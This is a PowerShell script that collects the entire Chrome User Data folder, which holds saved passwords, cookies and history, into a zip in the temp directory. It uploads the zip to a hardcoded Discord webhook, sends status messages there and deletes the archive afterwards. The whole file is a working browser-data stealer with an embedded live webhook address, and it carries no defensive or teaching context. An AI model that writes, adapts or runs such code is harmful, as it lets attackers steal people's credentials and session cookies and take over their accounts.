# Define the Discord Webhook URL (no `=` at the start)
$webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

# Function to create a zip file and return the path
function Create-ZipFile {
    param (
        [string]$chromePath,
        [string]$outputZip
    )
    
    # Get all files from Chrome User Data folder (skip files that are in use)
    $chromeFiles = Get-ChildItem "$chromePath" -Recurse | Where-Object { -not $_.PSIsContainer }
    $filesToAdd = @()

    foreach ($file in $chromeFiles) {
        try {
            # Check if the file is in use (locked by another process)
            $null = [System.IO.File]::OpenRead($file.FullName)
            $filesToAdd += $file.FullName
        } catch {
            Write-Host "Skipping file (in use): $($file.FullName)"
        }
    }

    if ($filesToAdd.Count -eq 0) {
        Send-DiscordMessage -message "No files to zip (all files are in use)."
        exit
    }

    # Create a zip of the Chrome User Data using Compress-Archive
    Compress-Archive -Path $filesToAdd -DestinationPath $outputZip
    if ($LASTEXITCODE -ne 0) {
        Send-DiscordMessage -message "Error creating zip file with Compress-Archive"
        exit
    }

    return $outputZip
}

# Function for uploading files to Discord via webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath
    )

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        $LF,
        [System.Text.Encoding]::ASCII.GetString($fileBytes),
        "--$boundary--",
        $LF
    ) -join $LF

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    try {
        # Send the file to Discord via webhook
        $response = Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyLines -Headers $headers
        Write-Host "File uploaded successfully."
    } catch {
        Write-Host "Failed to upload file to Discord: $_"
    }
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (-not (Test-Path $chromePath)) {
    Send-DiscordMessage -message "Chrome User Data path not found!"
    exit
}

# Define the path for the zip file
$outputZip = "$env:TEMP\chrome_data.zip"

# Create the zip file with Chrome User Data
$zipFile = Create-ZipFile -chromePath $chromePath -outputZip $outputZip

# Upload the zip file to Discord
Upload-FileToDiscord -filePath $zipFile

# Optionally, remove the zip file after uploading
Remove-Item $zipFile
